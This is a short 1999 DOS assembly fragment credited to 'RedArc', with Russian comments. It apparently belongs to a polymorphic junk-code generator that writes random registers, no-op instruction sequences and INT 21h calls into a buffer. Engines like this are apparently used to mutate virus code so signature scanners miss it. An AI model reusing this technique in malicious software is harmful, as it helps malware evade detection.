;Codegenerator (c) 1999 by RedArc

_al:
       mov byte ptr ds:[di],al
       inc di
       ret
_bx:
       mov word ptr ds:[di],bx
       add di,2
       ret
_al_bx:
       call _al
       call _bx
       ret
_bl:
       mov byte ptr ds:[di],bl
       inc di
       ret
_ax_bx:
       mov word ptr ds:[di],ax
       add di,2
       call _bx
       ret
;---
;Выбор случайного 16 битового регистра
;Input:  bl - reg1num
;Output: bh - reg2num
_Case_Rnd16:
         push ax
_Case:
         mov ah,7
         call RND_Tabelle
         mov bh,ah
         cmp bl,bh
         je _Case
         cmp ah,4
         je _Case
         pop ax
         ret
;---
;Получение 16 битового случайного числа
;Input:  none
;Output: bx - Rnd16
_Calc_Rnd16:
         push ax
         mov ah,0ffh
         call RND_Tabelle
         mov al,ah
         mov ah,0ffh
         call RND_Tabelle
         xchg bx,ax
         pop ax
         ret
;---
;Вставка пустого оператора
;Input:  none
;Output: none
_NOP:
       push ax bx cx dx si
       mov ah,6
       call RND_Tabelle
       cmp ah,0
       jne _NOP1
       pop si dx cx bx ax
       ret
_NOP1:
       cmp ah,1
       jne _NOP2
       mov byte ptr ds:[di],90h
       inc di
       pop si dx cx bx ax
       ret
_NOP2:
       cmp ah,2
       jne _NOP3
       mov bh,1
       mov bl,2
       push bx
       call _2_XCHG16
       pop bx
       call _2_XCHG16
       pop si dx cx bx ax
       ret
_NOP3:
       cmp ah,3
       jne _NOP4
       xor ax,ax
       mov bl,3
       call _2_ADD16V16
       pop si dx cx bx ax
       ret
_NOP4:
       mov bl,6
       mov ax,1234h
       call _2_SUB16V16
       mov bl,6
       mov ax,1234h
       call _2_ADD16V16
       pop si dx cx bx ax
       ret
;---
;Вставка прерывания 21h
;Input:  none
;Output: none
_INT21h:
       mov word ptr ds:[di],021cdh
       add di,2
       ret
;---
